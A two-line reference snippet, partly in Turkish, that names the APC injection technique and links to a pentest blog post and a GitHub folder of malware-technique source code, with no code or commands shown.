APC injection technique(https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html)
Github’taki kaynak kod: https://github.com/cocomelonc/meow/tree/master/2022-09-06-malware-tricks-23
